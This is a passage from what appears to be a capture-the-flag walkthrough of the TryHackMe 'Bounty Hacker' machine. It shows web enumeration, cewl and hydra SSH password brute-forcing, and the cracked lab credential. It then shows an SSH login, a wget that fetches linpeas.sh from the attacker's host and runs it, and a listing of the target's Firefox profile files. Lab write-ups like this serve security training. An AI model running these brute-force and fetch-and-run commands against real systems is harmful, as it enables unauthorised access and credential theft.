http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span><span style="color:#f92672">/</span>index<span style="color:#f92672">.</span>html           (Status: <span style="color:#ae81ff">200</span>) [Size: <span style="color:#ae81ff">969</span>]                                  
                                                                                                    
<span style="color:#f92672">===============================================================</span>
<span style="color:#ae81ff">2021</span><span style="color:#f92672">/</span><span style="color:#ae81ff">04</span><span style="color:#f92672">/</span><span style="color:#ae81ff">09</span> <span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">05</span>:<span style="color:#ae81ff">33</span> Finished
<span style="color:#f92672">===============================================================</span>
</code></pre></div><blockquote>
<p>Nothing with that either, let&rsquo;s start another scan with <code>/usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt</code> and keep it running in the background and move with <strong>cewl</strong> against the site.</p>
</blockquote>
<p>Running cewl:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>hgfs<span style="color:#f92672">/</span>THM<span style="color:#f92672">/</span>Bounty Hacker]
<span style="color:#960050;background-color:#1e0010">└─</span><span style="color:#75715e"># cewl -k -d 10 -w potential-usernames.txt -a -e http://10.10.56.222                                                                                                                                         1 ⨯</span>
CeWL <span style="color:#ae81ff">5.4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">8</span> (Inclusion) Robin Wood (robin<span style="color:#a6e22e">@digi.ninja</span>) (https:<span style="color:#f92672">//</span>digi<span style="color:#f92672">.</span>ninja<span style="color:#f92672">/</span>)
</code></pre></div><p>The running arguments mean:</p>
<ul>
<li><code>-k, --keep</code>: Keep the downloaded file.</li>
<li><code>-d &lt;x&gt;,--depth &lt;x&gt;</code>: Depth to spider to, default 2.</li>
<li><code>-w, --write</code>: Write the output to the file.</li>
<li><code>-a, --meta</code>: include meta data.</li>
<li><code>-e, --email</code>: Include email addresses.</li>
</ul>
<p>The argument <code>-e</code> wasn&rsquo;t required. Let&rsquo;s now try the list against SSH open on the host.</p>
<p>Alright, let&rsquo;s try all the things we&rsquo;ve in todo.</p>
<ul>
<li>Bruteforce using <code>cewl</code> list against <code>rocks.txt</code></li>
<li>Bruteforce using <code>rocks.txt</code> list against <code>rocks.txt</code></li>
</ul>
<blockquote>
<p>Bruteforce using <code>cewl</code> list against <code>rocks.txt</code></p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>hgfs<span style="color:#f92672">/</span>THM<span style="color:#f92672">/</span>Bounty Hacker]                                                                                                                                                                       
<span style="color:#960050;background-color:#1e0010">└─</span><span style="color:#75715e"># hydra -L potential-usernames.txt -P locks.txt 10.10.56.222 -s 22 ssh -vV</span>
Hydra v9<span style="color:#f92672">.</span><span style="color:#ae81ff">1</span> (c) <span style="color:#ae81ff">2020</span> by van Hauser<span style="color:#f92672">/</span>THC <span style="color:#f92672">&amp;</span> David Maciejak <span style="color:#f92672">-</span> Please do <span style="color:#f92672">not</span> use <span style="color:#f92672">in</span> military <span style="color:#f92672">or</span> secret service organizations, <span style="color:#f92672">or</span> <span style="color:#66d9ef">for</span> illegal purposes (this <span style="color:#f92672">is</span> non<span style="color:#f92672">-</span>binding, these <span style="color:#f92672">***</span> ignore laws <span style="color:#f92672">and</span> ethics anyway)<span style="color:#f92672">.</span>    
                                                                                                                                                                                                                   
Hydra (https:<span style="color:#f92672">//</span>github<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>vanhauser<span style="color:#f92672">-</span>thc<span style="color:#f92672">/</span>thc<span style="color:#f92672">-</span>hydra) starting at <span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">04</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span> <span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">21</span>:<span style="color:#ae81ff">23</span>                                                                                                                                 
[WARNING] Many SSH configurations limit the number of parallel tasks, it <span style="color:#f92672">is</span> recommended to reduce the tasks: use <span style="color:#f92672">-</span>t <span style="color:#ae81ff">4</span>                                                                                              
[DATA] max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">1898</span> login tries (l:<span style="color:#ae81ff">73</span><span style="color:#f92672">/</span>p:<span style="color:#ae81ff">26</span>), <span style="color:#f92672">~</span><span style="color:#ae81ff">119</span> tries per task                                                                                                              
[DATA] attacking ssh:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span>:<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>                                                                                                                                                                            
[VERBOSE] Resolving addresses <span style="color:#f92672">...</span> [VERBOSE] resolving done                                                                                                                                                         
[INFO] Testing <span style="color:#66d9ef">if</span> password authentication <span style="color:#f92672">is</span> supported by ssh:<span style="color:#f92672">//</span>you<span style="color:#a6e22e">@10.10.56.222</span>:<span style="color:#ae81ff">22</span>                                                                                                                                
[INFO] Successful, password authentication <span style="color:#f92672">is</span> supported by ssh:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span>:<span style="color:#ae81ff">22</span>                                                                                                                                   
[ATTEMPT] target <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span> <span style="color:#f92672">-</span> login <span style="color:#e6db74">&#34;you&#34;</span> <span style="color:#f92672">-</span> <span style="color:#66d9ef">pass</span> <span style="color:#e6db74">&#34;rEddrAGON&#34;</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1898</span> [child <span style="color:#ae81ff">0</span>] (<span style="color:#ae81ff">0</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0</span>)                                                                                                                         
[ATTEMPT] target <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span> <span style="color:#f92672">-</span> login <span style="color:#e6db74">&#34;you&#34;</span> <span style="color:#f92672">-</span> <span style="color:#66d9ef">pass</span> <span style="color:#e6db74">&#34;ReDdr4g0nSynd!cat3&#34;</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span> of <span style="color:#ae81ff">1898</span> [child <span style="color:#ae81ff">1</span>] (<span style="color:#ae81ff">0</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0</span>)                                                                                                                
[ATTEMPT] target <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span> <span style="color:#f92672">-</span> login <span style="color:#e6db74">&#34;you&#34;</span> <span style="color:#f92672">-</span> <span style="color:#66d9ef">pass</span> <span style="color:#e6db74">&#34;Dr@gOn$yn9icat3&#34;</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span> of <span style="color:#ae81ff">1898</span> [child <span style="color:#ae81ff">2</span>] (<span style="color:#ae81ff">0</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0</span>)                                                                                                                   
[ATTEMPT] target <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span> <span style="color:#f92672">-</span> login <span style="color:#e6db74">&#34;you&#34;</span> <span style="color:#f92672">-</span> <span style="color:#66d9ef">pass</span> <span style="color:#e6db74">&#34;R3DDr46ONSYndIC@Te&#34;</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span> of <span style="color:#ae81ff">1898</span> [child <span style="color:#ae81ff">3</span>] (<span style="color:#ae81ff">0</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0</span>)                                                                                                                
[ATTEMPT] target <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span> <span style="color:#f92672">-</span> login <span style="color:#e6db74">&#34;you&#34;</span> <span style="color:#f92672">-</span> <span style="color:#66d9ef">pass</span> <span style="color:#e6db74">&#34;ReddRA60N&#34;</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">5</span> of <span style="color:#ae81ff">1898</span> [child <span style="color:#ae81ff">4</span>] (<span style="color:#ae81ff">0</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0</span>)                                                                                                                         
[ATTEMPT] target <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span> <span style="color:#f92672">-</span> login <span style="color:#e6db74">&#34;you&#34;</span> <span style="color:#f92672">-</span> <span style="color:#66d9ef">pass</span> <span style="color:#e6db74">&#34;R3dDrag0nSynd1c4te&#34;</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">6</span> of <span style="color:#ae81ff">1898</span> [child <span style="color:#ae81ff">5</span>] (<span style="color:#ae81ff">0</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0</span>)
<span style="color:#f92672">...</span>
</code></pre></div><p>That didn&rsquo;t work, let&rsquo;s continue to the other combination of lists.</p>
<blockquote>
<p>Bruteforce using <code>rocks.txt</code> list against <code>rocks.txt</code></p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>hgfs<span style="color:#f92672">/</span>THM<span style="color:#f92672">/</span>Bounty Hacker]                                                                                                                                                                       
<span style="color:#960050;background-color:#1e0010">└─</span><span style="color:#75715e"># grc hydra -L locks.txt -P locks.txt 10.10.56.222 -s 22 ssh -vV -I                                                                                                                                              </span>
Hydra v9<span style="color:#f92672">.</span><span style="color:#ae81ff">1</span> (c) <span style="color:#ae81ff">2020</span> by van Hauser<span style="color:#f92672">/</span>THC <span style="color:#f92672">&amp;</span> David Maciejak <span style="color:#f92672">-</span> Please do <span style="color:#f92672">not</span> use <span style="color:#f92672">in</span> military <span style="color:#f92672">or</span> secret service organizations, <span style="color:#f92672">or</span> <span style="color:#66d9ef">for</span> illegal purposes (this <span style="color:#f92672">is</span> non<span style="color:#f92672">-</span>binding, these <span style="color:#f92672">***</span> ignore laws <span style="color:#f92672">and</span> ethics anyway)<span style="color:#f92672">.</span>    
                                                                                                                                                                                                                   
Hydra (https:<span style="color:#f92672">//</span>github<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>vanhauser<span style="color:#f92672">-</span>thc<span style="color:#f92672">/</span>thc<span style="color:#f92672">-</span>hydra) starting at <span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">04</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span> <span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">21</span>:<span style="color:#ae81ff">54</span>                                                                                                                                 
[WARNING] Many SSH configurations limit the number of parallel tasks, it <span style="color:#f92672">is</span> recommended to reduce the tasks: use <span style="color:#f92672">-</span>t <span style="color:#ae81ff">4</span>                                                                                              
[WARNING] Restorefile (ignored <span style="color:#f92672">...</span>) <span style="color:#f92672">from</span> a previous session found, to prevent overwriting, <span style="color:#f92672">./</span>hydra<span style="color:#f92672">.</span>restore                                                                                                         
[DATA] max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">676</span> login tries (l:<span style="color:#ae81ff">26</span><span style="color:#f92672">/</span>p:<span style="color:#ae81ff">26</span>), <span style="color:#f92672">~</span><span style="color:#ae81ff">43</span> tries per task                                                                                                                
[DATA] attacking ssh:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span>:<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>                                                                                                                                                                            
[VERBOSE] Resolving addresses <span style="color:#f92672">...</span> [VERBOSE] resolving done                                                                                                                                                         
[INFO] Testing <span style="color:#66d9ef">if</span> password authentication <span style="color:#f92672">is</span> supported by ssh:<span style="color:#f92672">//</span>rEddrAGON<span style="color:#a6e22e">@10.10.56.222</span>:<span style="color:#ae81ff">22</span>                                                                                                                          
[INFO] Successful, password authentication <span style="color:#f92672">is</span> supported by ssh:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span>:<span style="color:#ae81ff">22</span>                                                                                                                                   
[ATTEMPT] target <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span> <span style="color:#f92672">-</span> login <span style="color:#e6db74">&#34;rEddrAGON&#34;</span> <span style="color:#f92672">-</span> <span style="color:#66d9ef">pass</span> <span style="color:#e6db74">&#34;rEddrAGON&#34;</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">676</span> [child <span style="color:#ae81ff">0</span>] (<span style="color:#ae81ff">0</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0</span>)                                                                                                                    
[ATTEMPT] target <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span> <span style="color:#f92672">-</span> login <span style="color:#e6db74">&#34;rEddrAGON&#34;</span> <span style="color:#f92672">-</span> <span style="color:#66d9ef">pass</span> <span style="color:#e6db74">&#34;ReDdr4g0nSynd!cat3&#34;</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span> of <span style="color:#ae81ff">676</span> [child <span style="color:#ae81ff">1</span>] (<span style="color:#ae81ff">0</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0</span>)                                                                                                           
[ATTEMPT] target <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span> <span style="color:#f92672">-</span> login <span style="color:#e6db74">&#34;rEddrAGON&#34;</span> <span style="color:#f92672">-</span> <span style="color:#66d9ef">pass</span> <span style="color:#e6db74">&#34;Dr@gOn$yn9icat3&#34;</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span> of <span style="color:#ae81ff">676</span> [child <span style="color:#ae81ff">2</span>] (<span style="color:#ae81ff">0</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0</span>)                                                                                                              
[ATTEMPT] target <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span> <span style="color:#f92672">-</span> login <span style="color:#e6db74">&#34;rEddrAGON&#34;</span> <span style="color:#f92672">-</span> <span style="color:#66d9ef">pass</span> <span style="color:#e6db74">&#34;R3DDr46ONSYndIC@Te&#34;</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span> of <span style="color:#ae81ff">676</span> [child <span style="color:#ae81ff">3</span>] (<span style="color:#ae81ff">0</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0</span>)
<span style="color:#f92672">....</span>
</code></pre></div><p>Scan went on and nothing!</p>
<p>—</p>
<p>Now we need to go back to our findings, since, we aren&rsquo;t able to move forward with these. Relooking at the file <code>task.txt</code>, we can see that it also has an username in it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>hgfs<span style="color:#f92672">/</span>THM<span style="color:#f92672">/</span>Bounty Hacker]
<span style="color:#960050;background-color:#1e0010">└─</span><span style="color:#75715e"># cat task.txt</span>
<span style="color:#ae81ff">1.</span>) Protect Vicious<span style="color:#f92672">.</span>
<span style="color:#ae81ff">2.</span>) Plan <span style="color:#66d9ef">for</span> Red Eye pickup on the moon<span style="color:#f92672">.</span>

<span style="color:#f92672">-</span>lin
</code></pre></div><p>See that <code>lin</code> signature/name in the end? Let&rsquo;s try that with the list <code>rocks.txt</code> against the host.</p>
<h3 id="exploitation">Exploitation</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>hgfs<span style="color:#f92672">/</span>THM<span style="color:#f92672">/</span>Bounty Hacker]
<span style="color:#960050;background-color:#1e0010">└─</span><span style="color:#75715e"># hydra -l lin -P locks.txt 10.10.56.222 -s 22 ssh -t 4 -I                                                                                                                                                 130 ⨯</span>
Hydra v9<span style="color:#f92672">.</span><span style="color:#ae81ff">1</span> (c) <span style="color:#ae81ff">2020</span> by van Hauser<span style="color:#f92672">/</span>THC <span style="color:#f92672">&amp;</span> David Maciejak <span style="color:#f92672">-</span> Please do <span style="color:#f92672">not</span> use <span style="color:#f92672">in</span> military <span style="color:#f92672">or</span> secret service organizations, <span style="color:#f92672">or</span> <span style="color:#66d9ef">for</span> illegal purposes (this <span style="color:#f92672">is</span> non<span style="color:#f92672">-</span>binding, these <span style="color:#f92672">***</span> ignore laws <span style="color:#f92672">and</span> ethics anyway)<span style="color:#f92672">.</span>

Hydra (https:<span style="color:#f92672">//</span>github<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>vanhauser<span style="color:#f92672">-</span>thc<span style="color:#f92672">/</span>thc<span style="color:#f92672">-</span>hydra) starting at <span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">04</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span> <span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">29</span>:<span style="color:#ae81ff">38</span>
[DATA] max <span style="color:#ae81ff">4</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">4</span> tasks, <span style="color:#ae81ff">26</span> login tries (l:<span style="color:#ae81ff">1</span><span style="color:#f92672">/</span>p:<span style="color:#ae81ff">26</span>), <span style="color:#f92672">~</span><span style="color:#ae81ff">7</span> tries per task
[DATA] attacking ssh:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span>:<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>
[<span style="color:#ae81ff">22</span>][ssh] host: <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span>   login: lin   password: RedDr4gonSynd1cat3
<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
Hydra (https:<span style="color:#f92672">//</span>github<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>vanhauser<span style="color:#f92672">-</span>thc<span style="color:#f92672">/</span>thc<span style="color:#f92672">-</span>hydra) finished at <span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">04</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span> <span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">29</span>:<span style="color:#ae81ff">50</span>
</code></pre></div><p>—</p>
<p>That worked!</p>
<p><code>lin:RedDr4gonSynd1cat3</code></p>
<p>—</p>
<p>Let&rsquo;s SSH into the host and grab the <code>user.txt</code> flag</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>hgfs<span style="color:#f92672">/</span>THM<span style="color:#f92672">/</span>Bounty Hacker]
<span style="color:#960050;background-color:#1e0010">└─</span><span style="color:#75715e"># ssh lin@10.10.56.222                                                                        </span>
The authenticity of host <span style="color:#e6db74">&#39;10.10.56.222 (10.10.56.222)&#39;</span> can<span style="color:#e6db74">&#39;t be established.</span>
ECDSA key fingerprint <span style="color:#f92672">is</span> SHA256:fzjl1gnXyEZI9px29GF<span style="color:#f92672">/</span>tJr<span style="color:#f92672">+</span>u8o9i88XXfjggSbAgbE<span style="color:#f92672">.</span>
Are you sure you want to <span style="color:#66d9ef">continue</span> connecting (yes<span style="color:#f92672">/</span>no<span style="color:#f92672">/</span>[fingerprint])<span style="color:#960050;background-color:#1e0010">?</span> yes
<span style="color:#a6e22e">Warning</span>: Permanently added <span style="color:#e6db74">&#39;10.10.56.222&#39;</span> (ECDSA) to the list of known hosts<span style="color:#f92672">.</span>
lin<span style="color:#a6e22e">@10.10.56.222</span><span style="color:#e6db74">&#39;s password: </span>
Welcome to Ubuntu <span style="color:#ae81ff">16.04</span><span style="color:#f92672">.</span><span style="color:#ae81ff">6</span> LTS (GNU<span style="color:#f92672">/</span>Linux <span style="color:#ae81ff">4.15</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span><span style="color:#f92672">-</span><span style="color:#ae81ff">101</span><span style="color:#f92672">-</span>generic x86_64)

 <span style="color:#f92672">*</span> Documentation:  https:<span style="color:#f92672">//</span>help<span style="color:#f92672">.</span>ubuntu<span style="color:#f92672">.</span>com
 <span style="color:#f92672">*</span> Management:     https:<span style="color:#f92672">//</span>landscape<span style="color:#f92672">.</span>canonical<span style="color:#f92672">.</span>com
 <span style="color:#f92672">*</span> Support:        https:<span style="color:#f92672">//</span>ubuntu<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>advantage

<span style="color:#ae81ff">83</span> packages can be updated<span style="color:#f92672">.</span>
<span style="color:#ae81ff">0</span> updates are security updates<span style="color:#f92672">.</span>

Last login: Sun Jun  <span style="color:#ae81ff">7</span> <span style="color:#ae81ff">22</span>:<span style="color:#ae81ff">23</span>:<span style="color:#ae81ff">41</span> <span style="color:#ae81ff">2020</span> <span style="color:#f92672">from</span> <span style="color:#ae81ff">192.168</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.14</span>
lin<span style="color:#a6e22e">@bountyhacker</span>:<span style="color:#f92672">~/</span>Desktop<span style="color:#960050;background-color:#1e0010">$</span> 
lin<span style="color:#a6e22e">@bountyhacker</span>:<span style="color:#f92672">~/</span>Desktop<span style="color:#960050;background-color:#1e0010">$</span> id
uid<span style="color:#f92672">=</span><span style="color:#ae81ff">1001</span>(lin) gid<span style="color:#f92672">=</span><span style="color:#ae81ff">1001</span>(lin) groups<span style="color:#f92672">=</span><span style="color:#ae81ff">1001</span>(lin)
lin<span style="color:#a6e22e">@bountyhacker</span>:<span style="color:#f92672">~/</span>Desktop<span style="color:#960050;background-color:#1e0010">$</span>
lin<span style="color:#a6e22e">@bountyhacker</span>:<span style="color:#f92672">~/</span>Desktop<span style="color:#960050;background-color:#1e0010">$</span> wc <span style="color:#f92672">-</span>c user<span style="color:#f92672">.</span>txt 
<span style="color:#ae81ff">21</span> user<span style="color:#f92672">.</span>txt
</code></pre></div><p>We&rsquo;re inside! 💀 —</p>
<p>Submitted flag and I just realized that I should have taken a look at hints to save some of the time wasted in using bogus lists! 😖</p>
<p>Oh well, can&rsquo;t reverse time 🙏</p>
<p><img src="/img/bounty_hacker-thm/Untitled%201.png" alt=""></p>
<h3 id="privileges-escalation">Privileges Escalation</h3>
<p>Let&rsquo;s run <code>[linpeas.sh](http://linpeas.sh)</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">lin<span style="color:#a6e22e">@bountyhacker</span>:<span style="color:#f92672">~</span><span style="color:#960050;background-color:#1e0010">$</span> wget http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.17</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.120</span><span style="color:#f92672">/</span>linpeas<span style="color:#f92672">.</span>sh <span style="color:#f92672">&amp;&amp;</span> chmod <span style="color:#f92672">+</span>x linpeas<span style="color:#f92672">.</span>sh
                                                    
<span style="color:#f92672">--</span><span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">04</span><span style="color:#f92672">-</span><span style="color:#ae81ff">08</span> <span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">34</span>:<span style="color:#ae81ff">29</span><span style="color:#f92672">--</span>  http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.17</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.120</span><span style="color:#f92672">/</span>linpeas<span style="color:#f92672">.</span>sh
Connecting to <span style="color:#ae81ff">10.17</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.120</span>:<span style="color:#ae81ff">80.</span><span style="color:#f92672">..</span> connected<span style="color:#f92672">.</span>  
HTTP request sent, awaiting response<span style="color:#f92672">...</span> <span style="color:#ae81ff">200</span> OK                                                           
Length: <span style="color:#ae81ff">328992</span> (<span style="color:#ae81ff">321</span>K) [text<span style="color:#f92672">/</span>x<span style="color:#f92672">-</span>sh]
Saving to: <span style="color:#960050;background-color:#1e0010">‘</span>linpeas<span style="color:#f92672">.</span>sh<span style="color:#960050;background-color:#1e0010">’</span>
                                                    
linpeas<span style="color:#f92672">.</span>sh                                           <span style="color:#ae81ff">100</span><span style="color:#f92672">%</span>[<span style="color:#f92672">=====================================================================================================================&gt;</span>] <span style="color:#ae81ff">321.28</span>K   <span style="color:#ae81ff">262</span>KB<span style="color:#f92672">/</span>s    <span style="color:#f92672">in</span> <span style="color:#ae81ff">1.2</span>s    

<span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">04</span><span style="color:#f92672">-</span><span style="color:#ae81ff">08</span> <span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">34</span>:<span style="color:#ae81ff">31</span> (<span style="color:#ae81ff">262</span> KB<span style="color:#f92672">/</span>s) <span style="color:#f92672">-</span> <span style="color:#960050;background-color:#1e0010">‘</span>linpeas<span style="color:#f92672">.</span>sh<span style="color:#960050;background-color:#1e0010">’</span> saved [<span style="color:#ae81ff">328992</span><span style="color:#f92672">/</span><span style="color:#ae81ff">328992</span>]

lin<span style="color:#a6e22e">@bountyhacker</span>:<span style="color:#f92672">~</span><span style="color:#960050;background-color:#1e0010">$</span> 
lin<span style="color:#a6e22e">@bountyhacker</span>:<span style="color:#f92672">~</span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#f92672">./</span>linpeas<span style="color:#f92672">.</span>sh
</code></pre></div><p>Let&rsquo;s go through the interesting things.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">[<span style="color:#f92672">+</span>] Interesting Firefox Files                                                                            
[i] https:<span style="color:#f92672">//</span>book<span style="color:#f92672">.</span>hacktricks<span style="color:#f92672">.</span>xyz<span style="color:#f92672">/</span>forensics<span style="color:#f92672">/</span>basic<span style="color:#f92672">-</span>forensics<span style="color:#f92672">-</span>esp<span style="color:#f92672">/</span>browser<span style="color:#f92672">-</span>artifacts<span style="color:#75715e">#firefox                                                                                                                            </span>
Found <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>lin<span style="color:#f92672">/.</span>mozilla                                                                                 
<span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>lin<span style="color:#f92672">/.</span>mozilla<span style="color:#f92672">/</span>firefox<span style="color:#f92672">/</span>o0cm87l0<span style="color:#f92672">.</span>default<span style="color:#f92672">-</span>release<span style="color:#f92672">/</span>addons<span style="color:#f92672">.</span>json                                          
<span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>lin<span style="color:#f92672">/.</span>mozilla<span style="color:#f92672">/</span>firefox<span style="color:#f92672">/</span>o0cm87l0<span style="color:#f92672">.</span>default<span style="color:#f92672">-</span>release<span style="color:#f92672">/</span>bookmarkbackups                               
<span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>lin<span style="color:#f92672">/.</span>mozilla<span style="color:#f92672">/</span>firefox<span style="color:#f92672">/</span>o0cm87l0<span style="color:#f92672">.</span>default<span style="color:#f92672">-</span>release<span style="color:#f92672">/</span>cookies<span style="color:#f92672">.</span>sqlite                                       
<span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>lin<span style="color:#f92672">/.</span>mozilla<span style="color:#f92672">/</span>firefox<span style="color:#f92672">/</span>o0cm87l0<span style="color:#f92672">.</span>default<span style="color:#f92672">-</span>release<span style="color:#f92672">/</span>favicons<span style="color:#f92672">.</span>sqlite                                      
<span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>lin<span style="color:#f92672">/.</span>mozilla<span style="color:#f92672">/</span>firefox<span style="color:#f92672">/</span>o0cm87l0<span style="color:#f92672">.</span>default<span style="color:#f92672">-</span>release<span style="color:#f92672">/</span>formhistory<span style="color:#f92672">.</span>sqlite                                   
<span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>lin<span style="color:#f92672">/.</span>mozilla<span style="color:#f92672">/</span>firefox<span style="color:#f92672">/</span>o0cm87l0<span style="color:#f92672">.</span>default<span style="color:#f92672">-</span>release<span style="color:#f92672">/</span>handlers<span style="color:#f92672">.</span>json                                                                                                                                                  
